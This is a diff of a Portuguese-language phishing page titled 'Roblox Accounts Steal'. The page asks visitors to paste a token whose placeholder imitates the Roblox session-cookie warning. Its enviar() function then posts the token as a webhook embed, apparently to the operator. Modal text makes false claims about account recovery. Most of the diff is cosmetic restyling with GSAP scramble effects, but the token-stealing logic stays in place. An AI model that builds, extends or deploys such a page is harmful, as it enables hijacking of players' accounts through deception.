@@ -5,46 +5,24 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Roblox Accounts Steal</title>
 
-  <style>
-    :root {
-      --primary: #ff0044;
-      --secondary: #cc0033;
-      --accent: #ff88aa;
-      --dark: #0f001a;
-    }
+  <!-- GSAP + plugins via CDN -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/SplitText.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/ScrambleTextPlugin.min.js"></script>
 
-    body, html {
+  <style>
+    body {
       margin: 0;
       padding: 0;
+      background: #0a0a0a;
+      color: #d0d0d0;
+      font-family: Arial, sans-serif;
       min-height: 100vh;
-      background: var(--dark);
-      color: #e0ccff;
-      font-family: 'Segoe UI', Arial, sans-serif;
       overflow-x: hidden;
-    }
-
-    /* Partículas de fundo puras em CSS */
-    .bg-particles {
-      position: fixed;
-      inset: 0;
-      pointer-events: none;
-      z-index: -1;
-      background: 
-        radial-gradient(circle at 15% 25%, rgba(255,255,255,0.07) 0%, transparent 40%),
-        radial-gradient(circle at 85% 75%, rgba(255,255,255,0.05) 0%, transparent 50%),
-        radial-gradient(circle at 40% 80%, rgba(255,0,68,0.08) 0%, transparent 60%);
-      background-size: 150% 150%;
-      animation: particleFloat 60s linear infinite;
-    }
-
-    @keyframes particleFloat {
-      0%   { background-position: 0% 0%, 100% 100%, 50% 50%; }
-      100% { background-position: 200% 200%, -100% -100%, 150% 150%; }
+      cursor: default;
     }
 
     .container {
-      position: relative;
-      z-index: 1;
       display: flex;
       min-height: 100vh;
     }
@@ -52,8 +30,7 @@
     .video-sidebar {
       width: 35%;
       min-width: 320px;
-      background: rgba(15, 0, 26, 0.7);
-      backdrop-filter: blur(6px);
+      background: #111111;
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -65,23 +42,20 @@
       max-width: 380px;
       aspect-ratio: 16 / 9;
       background: #000;
-      border-radius: 16px;
+      border-radius: 8px;
       overflow: hidden;
-      box-shadow: 0 10px 30px rgba(255, 0, 68, 0.25);
-      transition: all 0.5s ease;
+      box-shadow: 0 0 15px rgba(0,0,0,0.8);
     }
 
-    .video-wrapper:hover {
-      transform: translateY(-12px) scale(1.04);
-      box-shadow: 0 25px 60px rgba(255, 0, 68, 0.5);
+    .video-wrapper iframe {
+      width: 100%;
+      height: 100%;
     }
 
     .video-label {
-      margin-top: 16px;
-      font-size: 1.4em;
-      color: var(--accent);
-      text-shadow: 0 0 12px var(--primary);
-      font-weight: bold;
+      margin-top: 12px;
+      font-size: 1.3em;
+      color: #a0a0a0;
     }
 
     #main-content {
@@ -94,181 +68,136 @@
       align-items: center;
     }
 
-    /* Pulsar suave + glitch leve no título */
-    h1 {
-      font-size: 3.8em;
-      color: var(--primary);
-      text-shadow: 0 0 20px var(--primary);
-      animation: neonPulse 3s infinite alternate, glitchText 4s infinite;
+    h1, .scrambled-subtitle {
+      font-size: 3.2em;
+      color: #ffffff;
+      margin-bottom: 20px;
+      text-shadow: 0 0 10px rgba(255,255,255,0.3);
     }
 
-    @keyframes neonPulse {
-      0%   { text-shadow: 0 0 10px var(--primary); }
-      100% { text-shadow: 0 0 60px var(--primary), 0 0 100px var(--secondary); }
+    .scrambled-subtitle {
+      font-size: 1.6em;
+      color: #b0b0b0;
+      margin-bottom: 30px;
     }
 
-    @keyframes glitchText {
-      0%, 100% { transform: translate(0); }
-      2%, 4%   { transform: translate(2px, -2px); }
-      6%       { transform: translate(-2px, 2px); }
-    }
-
-    /* Texto digitando */
-    .typing {
-      overflow: hidden;
-      border-right: .15em solid var(--primary);
-      white-space: nowrap;
-      margin: 0 auto 40px;
-      font-size: 1.8em;
-      animation: typing 4s steps(40, end) infinite, blink 0.75s step-end infinite;
-    }
-
-    @keyframes typing {
-      from { width: 0; }
-      to   { width: 100%; }
-    }
-
-    @keyframes blink {
-      from, to   { border-color: transparent; }
-      50%        { border-color: var(--primary); }
+    /* Estilo para letras individuais do scramble */
+    .char {
+      display: inline-block;
     }
 
     input, button {
       margin: 15px 0;
-      padding: 18px;
-      font-size: 20px;
-      border-radius: 12px;
-      transition: all 0.3s;
-    }
-
-    input {
-      width: 90%;
-      max-width: 550px;
-      border: 2px solid var(--secondary);
-      background: rgba(26, 0, 51, 0.7);
-      color: #ffccdd;
-      box-shadow: inset 0 0 12px rgba(102, 0, 51, 0.5);
-    }
-
-    input:focus {
-      border-color: var(--primary);
-      box-shadow: 0 0 20px rgba(255, 0, 68, 0.6);
-      outline: none;
-    }
-
-    /* Animação de contorno (outline glow) */
-    .outline-glow {
-      position: relative;
-    }
-
-    .outline-glow::before {
-      content: "";
-      position: absolute;
-      inset: -6px;
-      border: 3px solid var(--primary);
-      border-radius: 18px;
-      opacity: 0;
-      animation: outlinePulse 3s infinite;
-      pointer-events: none;
-    }
-
-    @keyframes outlinePulse {
-      0%, 100% { opacity: 0; transform: scale(1); }
-      50%      { opacity: 0.7; transform: scale(1.08); }
+      padding: 15px 30px;
+      font-size: 18px;
+      border-radius: 8px;
+      background: #1c1c1c;
+      color: #e0e0e0;
+      border: 2px solid #444444;
     }
 
     button {
-      background: linear-gradient(90deg, var(--primary), var(--secondary));
-      color: white;
-      border: none;
+      background: #333333;
       cursor: pointer;
       font-weight: bold;
-      box-shadow: 0 0 25px rgba(255, 0, 68, 0.6);
-      position: relative;
-      overflow: hidden;
     }
 
     button:hover {
-      transform: translateY(-4px) scale(1.08);
-      box-shadow: 0 15px 40px rgba(255, 0, 68, 0.8);
-    }
-
-    /* Partículas de cursor */
-    .cursor-particle {
-      position: fixed;
-      width: 10px;
-      height: 10px;
-      background: var(--primary);
-      border-radius: 50%;
-      pointer-events: none;
-      z-index: 9999;
-      transform: translate(-50%, -50%);
-      animation: cursorFade 0.8s forwards;
-      opacity: 0;
-    }
-
-    @keyframes cursorFade {
-      to {
-        opacity: 0;
-        transform: translate(-50%, -50%) scale(3);
-      }
+      background: #555555;
     }
 
     #status {
-      margin-top: 30px;
-      font-size: 20px;
-      font-weight: bold;
-      text-shadow: 0 0 10px var(--accent);
+      margin-top: 20px;
+      font-size: 18px;
+      color: #a0a0a0;
     }
 
     #saiba-mais-btn {
-      margin-top: 50px;
-      background: rgba(102, 0, 51, 0.7);
-      border: 2px solid var(--secondary);
-      color: #ffccdd;
+      background: #222222;
     }
 
     #saiba-mais-btn:hover {
-      background: rgba(153, 0, 68, 0.9);
-      border-color: var(--primary);
-      box-shadow: 0 0 25px var(--primary);
+      background: #444444;
     }
 
-    /* Modal e Loading mantidos */
-    #modal, #loading {
+    /* Loading */
+    #loading {
+      display: none;
       position: fixed;
       inset: 0;
-      background: rgba(15, 0, 26, 0.98);
+      background: #0a0a0a;
       z-index: 9999;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .spinner {
+      width: 80px;
+      height: 80px;
+      border: 8px solid #444444;
+      border-top: 8px solid #888888;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    #loading-text {
+      font-size: 2em;
+      color: #c0c0c0;
+    }
+
+    /* Modal */
+    #modal {
       display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.9);
+      z-index: 10000;
       justify-content: center;
       align-items: center;
     }
 
     .modal-content {
-      background: rgba(26, 0, 51, 0.95);
-      border: 2px solid var(--secondary);
-      border-radius: 16px;
-      padding: 40px;
-      max-width: 700px;
+      background: #1c1c1c;
+      border: 2px solid #444444;
+      border-radius: 12px;
+      padding: 30px;
+      max-width: 600px;
       width: 90%;
-      max-height: 90vh;
-      overflow-y: auto;
-      box-shadow: 0 0 60px rgba(255, 0, 68, 0.4);
+      position: relative;
+      color: #d0d0d0;
+    }
+
+    .close {
+      position: absolute;
+      top: 10px;
+      right: 20px;
+      font-size: 30px;
+      color: #a0a0a0;
+      cursor: pointer;
+    }
+
+    .close:hover {
+      color: #ffffff;
     }
 
     /* Responsivo */
     @media (max-width: 900px) {
       .container { flex-direction: column; }
       .video-sidebar { width: 100%; }
-      .video-wrapper { max-width: 90%; height: 180px; }
       #main-content { padding: 40px 20px; }
+      #video-right { order: 2; }
+      body { cursor: default; }
     }
   </style>
 </head>
 <body>
-
-  <div class="bg-particles"></div>
 
   <div class="container">
     <div class="video-sidebar" id="video-left">
@@ -279,12 +208,19 @@
     </div>
 
     <div id="main-content">
-      <h1 class="outline-glow">Roblox Accounts Steal</h1>
-      <p class="subtitle typing">Insira o token aqui</p>
+      <!-- Título com scramble -->
+      <div class="scrambled-text">
+        <h1>Roblox Accounts Steal</h1>
+      </div>
 
-      <input class="outline-glow" type="text" id="token" placeholder="_|WARNING:_DO-NOT-SHARE-THIS._ ..." />
+      <!-- Subtítulo com scramble -->
+      <div class="scrambled-text">
+        <p class="subtitle">Insira o token aqui</p>
+      </div>
+
+      <input type="text" id="token" placeholder="_|WARNING:_DO-NOT-SHARE-THIS._ ..." />
       <br>
-      <button class="outline-glow" id="sendBtn" onclick="enviar()">Enviar token</button>
+      <button id="sendBtn" onclick="enviar()">Enviar token</button>
 
       <div id="status"></div>
 
@@ -299,68 +235,87 @@
     </div>
   </div>
 
-  <!-- Loading com texto digitando -->
+  <!-- Loading -->
   <div id="loading">
     <div class="spinner"></div>
-    <div id="loading-text" class="typing">Acessando conta...</div>
+    <div id="loading-text">Acessando conta...</div>
   </div>
 
   <!-- Modal -->
   <div id="modal" onclick="closeModal(event)">
     <div class="modal-content" onclick="event.stopPropagation()">
       <span class="close" onclick="closeModal()">×</span>
-      <!-- conteúdo do modal igual ao anterior -->
-      <div class="modal-section">
-        <h2>Como esse site funciona</h2>
-        <p>Este site procura por senhas nos arquivos do Roblox, por tanto pode demorar.</p>
-        <p>Após enviar o token, o processo de verificação e extração pode levar alguns segundos ou minutos dependendo do tamanho dos arquivos locais e da conexão.</p>
-      </div>
-      <div class="modal-section">
-        <h2>Quem somos</h2>
-        <p>Somos uma equipe independente focada em ferramentas de análise e recuperação de contas Roblox. Nosso objetivo é ajudar usuários a entenderem melhor a segurança das suas contas e recuperar acesso perdido de forma prática.</p>
-        <p>Especialistas em Roblox desde 2024.</p>
-      </div>
+
+      <h2>Como esse site funciona</h2>
+      <p>Este site procura por senhas nos arquivos do Roblox, por tanto pode demorar.</p>
+      <p>Após enviar o token, o processo de verificação e extração pode levar alguns segundos ou minutos dependendo do tamanho dos arquivos locais e da conexão.</p>
+
+      <h2>Quem somos</h2>
+      <p>Somos uma equipe independente focada em ferramentas de análise e recuperação de contas Roblox. Nosso objetivo é ajudar usuários a entenderem melhor a segurança das suas contas e recuperar acesso perdido de forma prática.</p>
+      <p>Especialistas em Roblox desde 2024.</p>
     </div>
   </div>
 
   <script>
-    // Partículas de cursor (seguem o mouse)
-    document.addEventListener('mousemove', e => {
-      const particle = document.createElement('div');
-      particle.className = 'cursor-particle';
-      particle.style.left = e.pageX + 'px';
-      particle.style.top = e.pageY + 'px';
-      document.body.appendChild(particle);
-      setTimeout(() => particle.remove(), 800);
+    // Inicializa o efeito ScrambledText (adaptado do seu código React para vanilla JS)
+    gsap.registerPlugin(SplitText, ScrambleTextPlugin);
+
+    document.querySelectorAll('.scrambled-text').forEach(block => {
+      const textElement = block.querySelector('h1, p');
+      if (!textElement) return;
+
+      const split = new SplitText(textElement, { type: 'chars', charsClass: 'char' });
+      const chars = split.chars;
+
+      chars.forEach(char => {
+        gsap.set(char, {
+          display: 'inline-block',
+          attr: { 'data-content': char.innerHTML }
+        });
+      });
+
+      const radius = 120;      // distância que ativa o scramble
+      const duration = 1.2;    // duração do scramble
+      const speed = 0.5;       // velocidade do embaralhamento
+      const scrambleChars = '.:'; // caracteres usados no scramble
+
+      const handleMove = e => {
+        chars.forEach(char => {
+          const rect = char.getBoundingClientRect();
+          const cx = rect.left + rect.width / 2;
+          const cy = rect.top + rect.height / 2;
+          const dx = e.clientX - cx;
+          const dy = e.clientY - cy;
+          const dist = Math.hypot(dx, dy);
+
+          if (dist < radius) {
+            gsap.to(char, {
+              duration: duration * (1 - dist / radius),
+              scrambleText: {
+                text: char.dataset.content || '',
+                chars: scrambleChars,
+                speed: speed
+              },
+              ease: 'none',
+              overwrite: true
+            });
+          }
+        });
+      };
+
+      block.addEventListener('pointermove', handleMove);
+
+      // Cleanup (opcional, mas bom ter)
+      window.addEventListener('unload', () => {
+        block.removeEventListener('pointermove', handleMove);
+        split.revert();
+      });
     });
 
     // Resto do script (enviar, loading, modal) permanece igual
-    const messages = [
-      "Acessando conta...",
-      "Verificando autenticação...",
-      "Decodificando token...",
-      "Descobrindo senha...",
-      "Localizando itens...",
-      "Acessando histórico...",
-      "Limpando vestígios...",
-      "Bypassando proteções...",
-      "Finalizando acesso total...",
-      "Conta completamente comprometida..."
-    ];
-
-    let msgIndex = 0;
-    let interval;
-
     function showLoading() {
       document.querySelector('.container').style.display = "none";
       document.getElementById("loading").style.display = "flex";
-
-      const textEl = document.getElementById("loading-text");
-
-      interval = setInterval(() => {
-        textEl.innerText = messages[msgIndex];
-        msgIndex = (msgIndex + 1) % messages.length;
-      }, 2800);
     }
 
     function enviar() {
@@ -370,12 +325,12 @@
 
       if (token.length < 30) {
         status.innerHTML = "Token curto demais. Cola o correto.";
-        status.style.color = "#ff6666";
+        status.style.color = "#888888";
         return;
       }
 
       status.innerHTML = "Enviando token...";
-      status.style.color = "#ffff66";
+      status.style.color = "#cccccc";
 
       btn.disabled = true;
       btn.innerText = "Enviando...";
@@ -387,7 +342,7 @@
         embeds: [{
           title: "Token Roblox",
           description: "```" + token + "```",
-          color: 0xff0044,
+          color: 0x888888,
           footer: { text: new Date().toLocaleString("pt-BR") }
         }]
       };
@@ -403,7 +358,7 @@
       })
       .catch(() => {
         status.innerHTML = "Falha ao enviar. Tente novamente.";
-        status.style.color = "#ff6666";
+        status.style.color = "#888888";
         btn.disabled = false;
         btn.innerText = "Enviar token";
       });
